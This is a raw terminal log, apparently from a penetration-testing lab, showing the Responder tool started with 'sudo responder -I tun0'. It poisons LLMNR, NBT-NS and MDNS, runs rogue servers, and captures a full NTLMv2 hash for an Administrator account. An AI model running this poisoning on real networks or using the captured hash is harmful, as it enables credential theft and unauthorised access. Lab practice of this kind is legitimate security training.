```bash
$sudo responder -I tun0                             
                                         __                                                                                                                               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.                                                                                                                  
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                                                                                                                  
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                                                                                                                    
                   |__|                                                                                                                                                   
                                                                                                                                                                          
           NBT-NS, LLMNR & MDNS Responder 3.0.6.0                                                                                                                         
                                                                                                                                                                          
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)                                                                                                                       
  To kill this script hit CTRL-C                                                                                                                                          
                                                                                                                                                                          
                                                                                                                                                                          
[+] Poisoners:                                                                                                                                                            
    LLMNR                      [ON]           
    NBT-NS                     [ON]                                                                      
    DNS/MDNS                   [ON]                                               
                                                                                                                                                                          
[+] Servers:                                                                                                                                                              
    HTTP server                [OFF]                                                           
    HTTPS server               [ON]       
    WPAD proxy                 [OFF]      
    Auth proxy                 [OFF]      
    SMB server                 [ON]       
    Kerberos server            [ON]       
    SQL server                 [ON]       
    FTP server                 [ON]       
    IMAP server                [ON]       
    POP3 server                [ON]       
    SMTP server                [ON]       
    DNS server                 [ON]       
    LDAP server                [ON]       
    RDP server                 [ON]       
    DCE-RPC server             [ON]       
    WinRM server               [ON]       

[+] HTTP Options:                         
    Always serving EXE         [OFF]      
    Serving EXE                [OFF]      
    Serving HTML               [OFF]      
    Upstream Proxy             [OFF]      

[+] Poisoning Options:                    
    Analyze Mode               [OFF]      
    Force WPAD auth            [OFF]      
    Force Basic Auth           [OFF]     
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.99]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-Q7YEHAW7ICW]
    Responder Domain Name      [NPT0.LOCAL]
    Responder DCE-RPC Port     [49528]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.68.231
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:3c6dbb813b088044:7EFE01B571B05BCAB8FD32DE38E3261B:01010000000000000056A74C28E4D90191913A10FC83DE7300000000020008004E0050005400300001001E00570049004E002D005100370059004500480041005700370049004300570004003400570049004E002D00510037005900450048004100570037004900430057002E004E005000540030002E004C004F00430041004C00030014004E005000540030002E004C004F00430041004C00050014004E005000540030002E004C004F00430041004C00070008000056A74C28E4D90106000400020000000800300030000000000000000100000000200000CC78B8BF406B73F5DA4F2D5FC81A438FA405B7B5C6BC9298A2E7B11576975ABB0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00390039000000000000000000
```